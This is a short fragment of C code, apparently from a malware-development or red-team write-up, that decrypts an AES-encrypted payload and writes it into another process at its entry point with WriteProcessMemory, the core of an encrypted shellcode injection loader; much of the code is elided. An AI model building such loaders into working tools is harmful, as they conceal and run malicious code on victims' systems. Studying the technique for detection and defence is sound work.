...
int main()
{
	...
	// decrypt the payload
	AESDecrypt((LPBYTE)payload, (size_t)payload_len, payload_key, (size_t)sizeof(payload_key));
	...
	cWriteProcessMemory(pi->hProcess, (LPVOID)addressofEntryPoint, payload, (size_t)payload_len, 0);
